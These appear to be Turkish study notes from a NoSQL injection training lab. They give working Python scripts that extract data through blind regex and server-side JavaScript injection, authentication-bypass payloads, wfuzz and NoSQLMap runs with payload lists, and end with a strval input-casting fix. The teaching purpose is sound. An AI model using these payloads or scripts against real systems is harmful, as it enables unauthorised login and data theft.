## Automating Blind Data Extraction

### Senaryo 

Blind injection ile veri sızdırmak manuel olarak oldukça sıkıcı hale gelir. Neyse ki, bu işlem çok kolay bir şekilde otomatikleştirilebilir, o yüzden bunu yapalım.

Franz'ın paketinin **`trackingNum`**'ını zaten sızdırdık, bu yüzden bu bölüm için yeni bir hedef kullanacağız. **`bmdyy`** adına gönderilmiş ve **tracking number**'ı `HTB{...` olan bir paketi sızdıracağız.

![Pasted image 20250325231434.png](/img/user/resimler/Pasted%20image%2020250325231434.png)


### Developing Script

Yapacağımız ilk şey '`oracle`'ı sorgulamak için bir fonksiyon oluşturmaktır.

```python
import requests
import json

# Oracle
def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text
```

Bu fonksiyon, **`/index.php`**'ye bir POST isteği gönderecek ve **`trackingNum`** değerini istediğimiz **query** ile ayarlayacaktır. Ardından, yanıtın içinde **`bmdyy`** metninin olup olmadığını kontrol eder, bu da **query**'mizin hedef paketiyle eşleştiğini gösterir.

`Oracle` fonksiyonunun amacına uygun çalışıp çalışmadığını, bilinen response'larla yapılan bir çift **[assert](https://www.tutorialspoint.com/python3/assertions_in_python.htm)** ifadesi ile doğrulayabiliriz. Bu durumda, `X` `trackingNum` olmadığını biliyoruz, bu yüzden **`trackingNum: "X"`** ile gönderilen bir istekte oracle'ın **`False`** döndüğünü doğrulayabiliriz. Ayrıca, **`trackingNum`**'ın **`HTB{.*`** şeklinde olduğunu biliyoruz, bu yüzden oracle fonksiyonunun **`True`** döndüğünü doğrulayabiliriz.

```python
# Oracle'ın doğru çalıştığından emin olun
assert (oracle("X") == False)
assert (oracle({"$regex": "HTB{.*"}) == True)
```

Bunu çalıştırırsak ve her şey doğru şekilde ayarlanmışsa, herhangi bir output olmamalıdır. Eğer çıktı alırsanız, muhtemelen kodunuzda bir yazım hatası vardır (örneğin, bu örnekte küçük `b` yerine büyük `B` kullanılması gibi):

```shell-session
[!bash!]$ python3 mangopost-exploit.py 

Traceback (most recent call last):
  File "/...SNIP.../mangopost-exploit.py", line 18, in <module>
    assert (req({"$regex": "^HTb{.*"}) == True)
AssertionError
```

Oracle fonksiyonumuz hazır ve doğru şekilde çalıştığını doğruladıktan sonra, **`tracking number`**'ı sızdırmaya geçebiliriz.

Bu bölüm için, takip numarasının şu formata uyduğunu varsayabiliriz: `^HTB{[0-9a-f]{32}}$`, yani **`HTB{`** ardından 32 karakter `[0-9a-f]` ve sonrasında bir **`}`** gelir. Bunu bildiğimiz için, aramamızı yalnızca bu karakterlerle sınırlayarak yapacağımız request sayısını önemli ölçüde azaltabiliriz.

```python
# Takip numarasını dump edin
trackingNum = "HTB{" # Takip numarasının ‘HTB{’ ile başladığı bilinmektedir
for _ in range(32): # Aşağıdakileri 32 kez tekrarlayın
    for c in "0123456789abcdef": # Karakterler arasında döngü [0-9a-f]
        if oracle({"$regex": "^" + trackingNum + c}): # <trackingNum> + <char>'ın $regex ile eşleşip eşleşmediğini kontrol edin
            trackingNum += c # Eğer varsa, trackingNum'a karakter ekle ...
            break # ... ve döngüden çıkmak
trackingNum += "}" # Takip numarasının sonuna bilinen ‘}’ ekleme
```

Bu kod, **RegEx** sorguları oluşturacak ve her seferinde bir karakter sızdırmak için **oracle** fonksiyonunu kullanarak tüm karakterler öğrenilene kadar devam edecektir. Kod tamamlandığında, **`tracking number`**'ın doğru olduğunu başka bir **`assert`** ile doğrulayabiliriz ve ardından bunu yazdırabiliriz:

```python
# Takip numarasının doğru olduğundan emin olun
assert (oracle(trackingNum) == True)

print("Tracking Number: " + trackingNum)
```


### finished script

Her şeyi bir araya getirdiğinizde, tamamlanmış script şu şekilde görünmelidir:

```python
#!/usr/bin/python3

import requests
import json

# Oracle
def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

# Oracle'ın doğru çalıştığından emin olun
assert (oracle("X") == False)
assert (oracle({"$regex": "^HTB{.*"}) == True)

# Takip numarasını dump edin
trackingNum = "HTB{" # Takip numarasının ‘HTB{’ ile başladığı bilinmektedir
for _ in range(32): # Aşağıdakileri 32 kez tekrarlayın
    for c in "0123456789abcdef": # Karakterler arasında döngü [0-9a-f]
        if oracle({"$regex": "^" + trackingNum + c}): # <trackingNum> + <char>'ın $regex ile eşleşip eşleşmediğini kontrol edin
            trackingNum += c # Eğer varsa, trackingNum'a karakter ekle ...
            break # ... ve döngüden çıkmak
trackingNum += "}" # Takip numarasının sonuna bilinen ‘}’ ekleme

# Takip numarasının doğru olduğundan emin olun
assert (oracle(trackingNum) == True)

print("Tracking Number: " + trackingNum)
```

Bu script çalıştırıldığında takip numarası başarıyla dump edilecektir. Alfabe (`0-9a-f`) çok küçük olduğundan, işlem çok hızlı ilerler; bu durumda, sadece yaklaşık 20 saniye sürer.

```shell-session
[!bash!]$ time python3 mangopost-exploit.py 

Tracking Number: HTB{...SNIP...}

real    0m23.006s
user    0m0.419s
sys     0m0.033s
```


## Server-Side JavaScript Injection

### Teori

NoSQL'e özgü bir injection türü **`JavaScript İnjection`'u**dur. Bu, bir saldırganın sunucunun, veritabanı context'inde rastgele JavaScript kodu çalıştırmasını sağlamasıdır. **JavaScript injection'u**, senaryoya bağlı olarak **in-band**, **blind** veya **out-of-band** olabilir. Bunun hızlı bir örneği, `username/password` kombinasyonlarını kontrol etmek için **`$where`** sorgusunu kullanan bir server'dır:

```javascript
...
.find({$where: "this.username == \"" + req.body['username'] + "\" && this.password == \"" + req.body['password'] + "\""});
...
```

Bu durumda, user input'u **`$where`** ile değerlendirilen JavaScript sorgusunda kullanılıyor ve bu da **JavaScript injection'ına** yol açıyor. Bir saldırgan burada birçok şey yapabilir. Örneğin, **authentication**'ı atlatmak için, **username** ve **password** olarak `" || ""=="""` ifadesini geçirebilir, böylece sunucu şu **query**'yi değerlendirir:

`db.users.find({$where: 'this.username == "" || ""=="" && this.password == "" || ""==""'})`

Bu da her **document**'ı döndürür ve muhtemelen saldırganı döndürülen kullanıcılardan biri olarak oturum açtırır.


### MangoOnline

Bu bölümde web uygulaması `MangoOnline`'a bakacağız. Bu uygulama `Server-Side JavaScript Injection`'a karşı savunmasızdır.

Sitenin kendisi sadece bir login formudur ve bakılacak başka bir şey yoktur.

![Pasted image 20250325234054.png](/img/user/resimler/Pasted%20image%2020250325234054.png)

#### Authentication Bypass

Formu rastgele verilerle doldurabilir ve daha iyi bir görünüm elde etmek için login request'ine müdahale edebiliriz. Request, authentication bypass bölümündeki `MangoMail` için olana benziyor.

![Pasted image 20250325234242.png](/img/user/resimler/Pasted%20image%2020250325234242.png)

Ancak, önceki authentication bypass yöntemlerini denersek, maalesef hiçbiri çalışmadığını fark edeceğiz. Bu noktada, sunucunun bir **`$where query`** çalıştırıp çalıştırmadığını kontrol etmek isteyebiliriz, bu da şu şekilde görünebilir:

```javascript
db.users.find({
    $where: 'this.username === "<username>" && this.password === "<password>"'
});
```

Bu örnek için, kullanıcı adını `" || true || ""==` olarak ayarlayabiliriz, bu da sorgu ifadesinin her zaman **`True`** döndürmesini sağlamalıdır, bağımsız olarak `this.username` ve `this.password` ne olursa olsun.

```javascript
db.users.find({
    $where: 'this.username === "" || true || ""=="" && this.password === "<password>"'
});
```

Bu sadece JavaScript'in değerlendirildiği bir durum olduğu için, ifadenin her zaman doğru döneceğini doğrulamak için tarayıcımızdaki developer konsolunu kullanabiliriz.

![Pasted image 20250325235131.png](/img/user/resimler/Pasted%20image%2020250325235131.png)

Beklendiği gibi, ifade `True` döner, hatta `this.username` ve `this.password` tanımlanmamış olsa bile. Bu onayı aldıktan sonra, bu username ve rastgele bir password'le giriş yapmayı deneyebiliriz, gerekli karakterleri URL kodlayarak dikkatlice işlem yapmamız gerekir.

![Pasted image 20250325235231.png](/img/user/resimler/Pasted%20image%2020250325235231.png)

Bu, `$where` sorgusunun tüm document'lerde `True` döndüğü için authentication'ı tamamen atlamamıza olanak sağlamalıdır.

![Pasted image 20250325235357.png](/img/user/resimler/Pasted%20image%2020250325235357.png)

Giriş yaptığımız kişinin (hangi document'la eşleştiysek) gerçek username'inin görüntülenmediğine dikkat edin. Bunun yerine kullandığımız `SSJI payload`'u görüntülenir.


#### Blind Data Extraction

Yani, **`Server-Side Javascript Injection`** ile kimlik doğrulamasını geçebileceğimizi kanıtladık ve giriş yaptığımız kullanıcının kullanıcı adının bize verilmediğini belirledik, şimdi bu bilgiyi çıkarmaya çalışalım!

Bunu yapmak için adımlar, **`Blind Data Extraction`** ve **`Automating Blind Data Extraction`** bölümlerindeki adımlarla temelde aynıdır, sadece farklı bir sözdizimi kullanıyoruz.

İlk istek olarak, şu payload'ı kullanabiliriz: `" || (this.username.match('^.*')) || ""=="` bu, `^.*` ile eşleşen bir kullanıcı adı olup olmadığını doğrulamak için kullanılacaktır. Bu, **`true`** döndürmesi (bizi giriş yaptırması) beklenir, yani bu daha çok bir doğrulama kontrolüdür.

![Pasted image 20250326001139.png](/img/user/resimler/Pasted%20image%2020250326001139.png)

Sonraki adımda, kullanıcı adının ilk karakterinin ne olduğunu tahmin etmeye başlayabiliriz, örneğin şu payload'ları kullanarak: `" || (this.username.match('^a.*')) || ""=="`. Eğer böyle bir kullanıcı adı yoksa, mesela `^a.*` durumu gibi, uygulama giriş yapmayı başarısız hale getirecektir.

![Pasted image 20250326001202.png](/img/user/resimler/Pasted%20image%2020250326001202.png)

Bir süre denedikten sonra, şu payload: `" || (this.username.match('^H.*')) || ""=="` bizi giriş yaptırıyor, yani `^H.*` ile eşleşen bir kullanıcı adı olduğu anlamına geliyor.

![Pasted image 20250326001221.png](/img/user/resimler/Pasted%20image%2020250326001221.png)

Bu adımlara devam ederek tüm username'i dump edebiliriz.


## Automating Server-Side JavaScript Injection

### Developing Script

Önceki bölümde, hedefin kullanıcı adının ilk beş karakterini (`HTB{?)` çıkarmayı başarmış olmalısınız. Geri kalan karakterleri çıkarmak için yüzlerce request göndermek yerine, (blind) SSJI aracılığıyla kullanıcı adını dump etmek için başka bir Python **script** yazacağız.

İlk olarak, `oracle` fonksiyonunu ve gerekli importları tanımlayacağız. Önceki bölümde, `" || true || ""=="` payload'ını kullanmıştık çünkü `true`'nun doğru olarak değerlendirilmesi biliniyor (açıkça). Bu **function**'da, `true`'yu sunucunun değerlendirmesini istediğimiz rastgele bir ifadeyle değiştireceğiz. Eğer ifade true dönerse, giriş yapılmış olur ve **function** `true` döndürür (`r.text` içinde "`Logged in as`" tespit edilir), eğer ifade `false` dönerse giriş yapılmaz, bu durumda **function** false döndürür.

Zaten şifrenin önemli olmadığını belirlemiştik, bu yüzden sabit bir '`x`' olarak ayarlayabiliriz.

```python
import requests
from urllib.parse import quote_plus

# Oracle (cevaplar True veya False)
num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in r.text
```

Oracle fonksiyonu tanımlandıktan sonra, doğru çalıştığını aşağıdaki iki **`assert`** ifadesiyle test edebiliriz:

```python
# Oracle'ın doğru çalıştığından emin olun
assert (oracle('false') == False)
assert (oracle('true') == True)
```

Şimdi her şey hazır olduğuna göre, kullanıcı adını **`Automating Blind Data Extraction`** bölümündeki **script**'e benzer şekilde **dump** etmeye devam edebiliriz. Bu bölümde, alfabenin yalnızca `0-9a-f` ile sınırlı olmadığını, bunun yerine tüm yazdırılabilir [ASCII karakterlerinin (32-127)](https://www.asciitable.com/) kullanıldığını unutmamalısınız.

```python
# Kullanıcı adını dump edin (‘regular’ search)
num_req = 0 # Request counter'ı 0'a ayarlayın
username = "HTB{" # Bilinen kullanıcı adı başlangıcı
i = 4 # İlk 4 karakteri atlamak için i'yi 4 olarak ayarlayın (HTB{)
while username[-1] != "}": # '}' (kullanıcı adının bilinen sonu) atılana kadar tekrarlayın
    for c in range(32, 127): # Tüm yazdırılabilir ASCII karakterleri arasında döngü
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) == %d' % (i, c)):
            username += chr(c) # İfade True olarak değerlendirilirse geçerli karakteri kullanıcı adına ekle
            break # Ve döngüyü kır
    i += 1 # Indeks sayacını artırır
assert (oracle('this.username == `%s`' % username) == True) # Kullanıcı adını doğrulayın
print("---- Regular search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
```

Kullandığımız özel **query** şu şekilde **template**'lenmiştir: `this.username.startsWith("HTB{") && this.username.charCodeAt(i) == c`. İlk kısım, istediğimiz **username**'i hedeflediğimizden emin olur (sadece `'HTB{'` ile başlayan bir **username** olduğu varsayılır) ve ikinci kısım, **string**'deki i. indisteki karakterin ASCII değerinin, döngüde bulunduğumuz değere (`c`) eşit olup olmadığını kontrol eder.

Bu noktada, **script**'i çalıştırabiliriz ve **username** başarıyla **dump** edilmelidir.

```shell-session
[!bash!]$ time python3 mangoonline-exploit.py 

---- Regular search ----
Flag: HTB{...SNIP...}
Requests: 1678

real    2m40.351s
user    0m2.626s
sys     0m0.407s
```

Not: Bu scriptin gerektirdiği çok sayıda istek nedeniyle, canlı hedefe karşı test edilirken başarısız olabilir. Aşağıdaki optimize edilmiş sürümde herhangi bir sorun yaşanmayacaktır.

### Optimizing Script

Bu **script** çalışsa da, çok verimsizdir. Eğer yalnızca birkaç düzine karakter uzunluğunda bir **username** **dump** ediyorsak, bu büyük bir sorun olmayabilir, ancak daha büyük miktarlarda veri exfiltrate etmeye çalışıyorsak, bu önemli olabilir.

Eğer popüler arama algoritmaları hakkında bilgi sahibiyseniz, **[binary search](https://www.geeksforgeeks.org/binary-search/)** algoritmasını duymuş olabilirsiniz. **Binary search**'ın temel fikri, arama alanını sürekli olarak ikiye bölerek aradığımız şeyi bulana kadar devam etmektir. Bu durumda, **`i`**. indisteki karakterin `ASCII değerini arıyoruz ve arama alanı 32-127` arasındadır.

**Binary search** algoritması, en kötü durumda `O(log_2(N))` zamanında çalışır, bu da sadece şunu ifade eden şık bir şekilde yazılmıştır: en kötü durumda tamamlanması için `log_2(N)` iterasyon gerektirir. Bu durumda, **binary search** uyguladığımızda, en kötü durumda hedef değeri bulmak için `7 iterasyon` gerekecektir, bu da şu anki en kötü durumumuz olan `95 iterasyondan` çok daha iyidir. Kısacası, bu algoritma çok zaman kazandıracak ve request sayısını azaltacaktır. Eğer teknik detayları anlamak isterseniz, bu [makaleye](https://www.geeksforgeeks.org/understanding-time-complexity-simple-examples/) göz atmanızı öneririm.

Algoritma zor gibi görünse de, uygulaması oldukça basittir - orijinal aramamızdan yalnızca birkaç satır daha fazla kod gerektirir.

```python
# Kullanıcı adını dump edin (binary search)
num_req = 0 # Request counter'ı sıfırlayın
username = "HTB{" # Bilinen kullanıcı adı başlangıcı
i = 4 # İlk 4 karakteri atlayın (HTB{)
while username[-1] != "}": # Kullanıcı adının sonu olan ‘}’ ile karşılaşana kadar tekrarlayın
    low = 32 # Search alanının düşük değerini ayarlayın (‘ ’)
    high = 127 # Search alanının yüksek değerini ayarlayın (‘~’)
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Search alanının orta noktasını hesaplayın
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # 'i' indeksindeki kullanıcı adının ASCII değeri < orta nokta ise, alt sınırı artırın ve tekrarlayın
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # 'i' indeksindeki kullanıcı adının ASCII değeri > orta nokta ise, üst sınırı azaltın ve tekrarlayın
        else:
            username += chr(mid) # ASCII değeri orta noktadan yüksek veya düşük değilse hedef değeri bulduk
            break # Döngüden çıkın
    i += 1 # İndeks sayacını artırır (bir sonraki karakter üzerinde çalışmaya başlar)
assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
```

Değiştirilen **script**'i çalıştırmak, istek sayısını 1678'den sadece 286'ya, zaman açısından ise 2 dakika 40 saniyeden 24 saniyeye düşürüyor! Bu, küçük veri parçalarını, örneğin bir **username**'i **dump** ederken büyük bir fark yaratmaz, ancak daha fazla veri çıkarmak istediğimizde, bu algoritmanın ne kadar zaman kazandıracağını tahmin edebilirsiniz.

```shell-session
[!bash!]$ time python3 mangoonline-exploit.py 

---- Binary search ----
Username: HTB{...SNIP...}
Requests: 286

real    0m24.186s
user    0m0.410s
sys     0m0.044s
```


### Finished script

Her iki algoritmayı da içeren script dosyasının tamamı şu şekildedir:

```python
#!/usr/bin/python3

import requests
from urllib.parse import quote_plus

# Oracle (cevaplar True veya False)
num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in r.text

# Oracle'ın doğru çalıştığından emin olun
assert (oracle('false') == False)
assert (oracle('true') == True)

# Kullanıcı adını dump et (‘regular’ search)
num_req = 0 # Request counter'ı 0'a ayarlayın
username = "HTB{" # Bilinen kullanıcı adı başlangıcı
i = 4 # İlk 4 karakteri atlamak için i'yi 4 olarak ayarlayın (HTB{)
while username[-1] != "}": # '}' (kullanıcı adının bilinen sonu) atılana kadar tekrarlayın
    for c in range(32, 128): #Tüm yazdırılabilir ASCII karakterleri arasında döngü
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) == %d' % (i, c)):
            username += chr(c) # İfade True olarak değerlendirilirse geçerli karakteri kullanıcı adına ekle
            break # Ve döngüyü kır
    i += 1 # İndeks sayacını artırır
assert (oracle('this.username == `%s`' % username) == True) # Kullanıcı adını doğrulayın
print("---- Regular search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
print()

# Kullanıcı adını dump et (binary search)
num_req = 0 # Request counter'ı sıfırlayın
username = "HTB{" # Bilinen kullanıcı adı başlangıcı
i = 4 # İlk 4 karakteri atlayın (HTB{)
while username[-1] != "}": # Kullanıcı adının sonu olan ‘}’ ile karşılaşana kadar tekrarlayın
    low = 32 # Search alanının düşük değerini ayarlayın (‘ ’)
    high = 127 # Search alanının yüksek değerini ayarlayın (‘~’)
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Search alanının orta noktasını hesaplayın
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # 'i' indeksindeki kullanıcı adının ASCII değeri < orta nokta ise, alt sınırı artırın ve tekrarlayın
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # 'i' indeksindeki kullanıcı adının ASCII değeri > orta nokta ise, üst sınırı azaltın ve tekrarlayın
        else:
            username += chr(mid) # ASCII değeri orta noktadan yüksek veya düşük değilse hedef değeri bulduk
            break # Döngüden çıkın
    i += 1 # Index sayacını artırır (bir sonraki karakter üzerinde çalışmaya başlar)
assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
```


## Tools of the Trade

### Wordlist'ler ile Fuzzing

**[Fuzzing](https://owasp.org/www-community/Fuzzing)**, testçinin bir programa büyük miktarda veri enjekte ederek yazılım arızalarını görmek için kullandığı bir tür **black-box testing** tekniğidir. **NoSQLi** testi context'inde, olası **NoSQLi payload**'larının bulunduğu **wordlist**'leri kullanarak, sunucunun nasıl farklı bir **response** verdiğini görmek, başarılı bir **data injection** işleminin göstergesi olacaktır.

**Fuzzing**'in etkinliği, büyük ölçüde **wordlist**'in seçimine bağlıdır. Ne yazık ki, **NoSQL** için çok fazla kamuya açık **wordlist** bulunmamaktadır, ancak işte birkaç tane:

Fuzzing'in verimliliği büyük ölçüde wordlist seçimine bağlıdır. Ne yazık ki NoSQL için çok fazla genel kelime listesi yoktur, ancak burada birkaç tane var:

- [seclists/Fuzzing/Databases/NoSQL.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/NoSQL.txt)
- [nosqlinjection_wordlists/mongodb_nosqli.txt](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)

Fuzzing'i göstermek için `MangoPost` uygulaması üzerinde [wfuzz](https://github.com/xmendez/wfuzz)'ı kullanabiliriz.

```shell-session
[!bash!]$ wfuzz -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt -u http://127.0.0.1/index.php -d '{"trackingNum": FUZZ}'

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1/index.php
Total requests: 22

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        0 L      6 W        35 Ch       "true, $where: '1 == 1'"
000000008:   200        0 L      6 W        35 Ch       "' } ], $comment:'successful MongoDB injection'"
000000009:   200        0 L      6 W        35 Ch       "db.injection.insert({success:1});"
000000010:   200        0 L      6 W        35 Ch       "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1"
000000003:   200        0 L      6 W        35 Ch       "$where: '1 == 1'"
000000005:   200        0 L      6 W        35 Ch       "1, $where: '1 == 1'"
000000004:   200        0 L      6 W        35 Ch       "', $where: '1 == 1'"
000000006:   200        0 L      6 W        35 Ch       "{ $ne: 1 }"
000000007:   200        0 L      6 W        35 Ch       "', $or: [ {}, { 'a':'a"
000000002:   200        0 L      6 W        35 Ch       ", $where: '1 == 1'"
000000011:   200        0 L      6 W        35 Ch       "|| 1==1"
000000013:   200        0 L      6 W        35 Ch       "' && this.password.match(/.*/)//+%00"
000000016:   200        0 L      6 W        35 Ch       "'%20%26%26%20this.passwordzz.match(/.*/)//+%00"
000000019:   200        0 L      6 W        35 Ch       "[$ne]=1"
000000020:   200        0 L      6 W        35 Ch       "';sleep(5000);"
000000017:   200        0 L      6 W        35 Ch       "{$gt: ''}"
000000018:   200        3 L      13 W       136 Ch      "{"$gt": ""}"
000000015:   200        0 L      6 W        35 Ch       "'%20%26%26%20this.password.match(/.*/)//+%00"
000000014:   200        0 L      6 W        35 Ch       "' && this.passwordzz.match(/.*/)//+%00"
000000022:   200        0 L      6 W        35 Ch       "{$nin: [""]}}"
000000012:   200        0 L      6 W        35 Ch       "' || 'a'=='a"
000000021:   200        0 L      6 W        35 Ch       "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"

Total time: 0.036365
Processed Requests: 22
Filtered Requests: 0
Requests/sec.: 604.9728
```

**`-z`** argümanı ile kullanacağımız **wordlist**'i sağladık (bu durumda SecLists), **`-u`** ile hedef uygulamanın URL'sini sağladık, ardından **`-d`** ile gönderilmesi gereken POST verisini (bu durumda takip numarasını içeren JSON object'i) sağladık. Takip numarası yerine, POST verisine **`FUZZ`** ekledik; bu, **Wfuzz**'ın **wordlist**'imizden gelen **payload**'larla **`FUZZ`**'ı değiştireceği anlamına gelir.

Sonuçlara baktığımızda, **`{"$gt":""}`**'nin öne çıktığını görebiliyoruz çünkü **response** boyutu diğer tüm **response**'larla karşılaştırıldığında `136` karakterdi, diğerleri ise `35` karakter uzunluğundaydı. Bu, bu özel **payload**'ın sunucunun farklı bir şekilde tepki vermesine neden olduğunu ima eder ve bunu, **payload**'ı manuel olarak tekrar gönderip sonucu görmek için takip etmeliyiz.


### Tools

#### NoSQLMap

**[NoSQLmap](https://github.com/codingo/NoSQLMap)**, NoSQL enjeksiyon zafiyetlerini tespit etmek için kullanılan açık kaynaklı bir Python-2 aracıdır. Aşağıdaki komutları çalıştırarak yükleyebiliriz ([Docker](https://github.com/codingo/NoSQLMap/tree/master/docker) konteyneri çalışmıyor gibi görünüyor).

```shell-session
[!bash!]$ git clone https://github.com/codingo/NoSQLMap.git
[!bash!]$ cd NoSQLMap
[!bash!]$ sudo apt install python2.7
[!bash!]$ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
[!bash!]$ python2 get-pip.py
[!bash!]$ pip2 install couchdb
[!bash!]$ pip2 install --upgrade setuptools
[!bash!]$ pip2 install pbkdf2
[!bash!]$ pip2 install pymongo
[!bash!]$ pip2 install ipcalc
```

Bu aracı **MangoMail** üzerinde gösterebiliriz. Varsayalım ki admin'in e-posta adresinin **`admin@admin.com`** olduğunu biliyoruz ve şifre alanının **NoSQL injection**'a karşı zayıf olup olmadığını test etmek istiyoruz. Bunu test etmek için **NoSQLMap**'i aşağıdaki argümanlarla çalıştırabiliriz:

- **`--attack 2`**: Web saldırısını belirtir
- **`--victim 127.0.0.1`**: IP adresini belirtir
- **`--webPort 80`**: Portu belirtir
- **`--uri /index.php`**: İstek göndereceğimiz URL'yi belirtir
- **`--httpMethod POST`**: POST istekleri göndereceğimizi belirtir
- **`--postData email,admin@admin.com,password,qwerty`**: Göndereceğimiz iki parametreyi, sırasıyla `admin@admin.com` ve **`qwerty`** varsayılan değerleriyle belirtir
- **`--injectedParameter 1`**: Şifre parametresini test etmek istediğimizi belirtir
- **`--injectSize 4`**: Rastgele oluşturulacak veriler için varsayılan bir boyut belirtir

```shell-session
[!bash!]$ python2 nosqlmap.py --attack 2 --victim 127.0.0.1 --webPort 80 --uri /index.php --httpMethod POST --postData 

email,admin@admin.com,password,qwerty --injectedParameter 1 --injectSize 4
Web App Attacks (POST)
===============
Checking to see if site at 127.0.0.1:80/index.php is up...
App is up!
List of parameters:
1-password
2-email
Injecting the password parameter...
Using admin@admin.com for injection testing.

Sending random parameter value...
Got response length of 1250.
No change in response size injecting a random parameter..

Test 1: PHP/ExpressJS != associative array injection
Successful injection!


Test 2:  PHP/ExpressJS > Undefined Injection
Successful injection!
Test 3: $where injection (string escape)
Successful injection!


Test 4: $where injection (integer escape)
Successful injection!


Test 5: $where injection string escape (single record)
Successful injection!


Test 6: $where injection integer escape (single record)
Successful injection!


Test 7: This != injection (string escape)
Successful injection!


Test 8:  This != injection (integer escape)
Successful injection!




Exploitable requests:
{'email': '[email]', 'password[$ne]': '[email]'}
{'email': '[email]', 'password[$gt]': ''}
{'password': "a'; return db.a.find(); var dummy='!", 'email': '[email]', 'password[$gt]': ''}
{'password': '1; return db.a.find(); var dummy=1', 'email': '[email]', 'password[$gt]': ''}
{'password': "a'; return db.a.findOne(); var dummy='!", 'email': '[email]', 'password[$gt]': ''}
{'password': '1; return db.a.findOne(); var dummy=1', 'email': '[email', 'password[$gt]': ''}
{'password': "a'; return this.a != '[email]'; var dummy='!", 'email': '[email]', 'password[$gt]': ''}
{'password': "1; return this.a != '[email]'; var dummy=1", 'email': '[email]', 'password[$gt]': ''}


Possibly vulnerable requests:



Timing based attacks:
String attack-Unsuccessful
Integer attack-Unsuccessful
```

Sonuçlar, injection'nun birden fazla istekle başarılı olduğunu gösteriyor ve bunları manuel olarak kontrol etmeye devam edebiliriz. Önceki bölümden hatırlayabileceğiniz gibi, az önce bir authentication bypass tespit etmiştik!

#### Burp-NoSQLiScanner

**Burp Suite Professional** için **NoSQL injection** zafiyetlerini taradığını iddia eden bir **plugin** bulunmaktadır. Ancak, her kişinin **Burp Suite Professional** lisansına sahip olduğunu varsayamayacağım için bu konuya daha derinlemesine girmiyoruz. Yine de bir lisansınız varsa, bunu incelemek isteyebilirsiniz.  
(**[GitHub bağlantısı](https://github.com/matrix/Burp-NoSQLiScanner), [BAppStore bağlantısı](https://portswigger.net/bappstore/605a859f0a814f0cbbdce92bc64233b4)**)


## Preventing NoSQL Injection Vulnerabilities

NoSQL injection güvenlik açıkları, user input'u önce düzgün bir şekilde sterilize edilmeden bir NoSQL query'ye aktarıldığında ortaya çıkar. Son 'bölümde' ele aldığımız dört örnek üzerinden gidelim ve neyin yanlış gittiğini ve bunların nasıl düzeltileceğini açıklayalım.


### Input Validation ile String Casting

#### MangoMail

MangoMail örneğinde, güvenlik açığı bulunan code server side'da bu şekilde görünüyordu:

```php
...
    if ($_SERVER['REQUEST_METHOD'] === "POST"):
        if (!isset($_POST['email'])) die("Missing `email` parameter");
        if (!isset($_POST['password'])) die("Missing `password` parameter");
        if (empty($_POST['email'])) die("`email` can not be empty");
        if (empty($_POST['password'])) die("`password` can not be empty");

        $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
        $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
        $cursor = $manager->executeQuery('mangomail.users', $query);
        
        if (count($cursor->toArray()) > 0) {
            ...
```

**Sorunun kaynağının**, `$_POST['email']` ve `$_POST['password']` değerlerinin **sanitization edilmeden** doğrudan **query** array'ine aktarılması olduğunu görebiliyoruz. Bu durum, **NoSQL injection** zafiyetine yol açarak kimlik doğrulamasını atlatmamıza olanak sağladı.

**MongoDB**, **[strongly-typed](https://www.techtarget.com/whatis/definition/strongly-typed)** bir veritabanıdır, yani bir **string** değeri geçirirseniz bunu **string** olarak değerlendirir (**`1 != "1"`**). Bu durum, **`weakly-typed`** olan **PHP (7.4)**'ten farklıdır; PHP'de **`1 == "1"`** ifadesi **`true`** olarak değerlendirilir. Hem **`email`** hem de **password** alanlarının **`string`** olması beklendiğinden, kullanıcı girdisini **`string`** olarak **cast** ederek **array** gibi farklı veri türlerinin geçirilmesini engelleyebiliriz.

```php
...
$query = new MongoDB\Driver\Query(array("email" => strval($_POST['email']), "password" => strval($_POST['password'])));
...
```

Artık `email[$ne]=x` gibi sorgular “`Array` ”e dönüştürülecek ve saldırı başarısız olacaktır.

```shell-session
[!bash!]$ php -a

Interactive mode enabled

php > echo strval(array("op" => "val"));
PHP Notice:  Array to string conversion in php shell code on line 1
Array
```

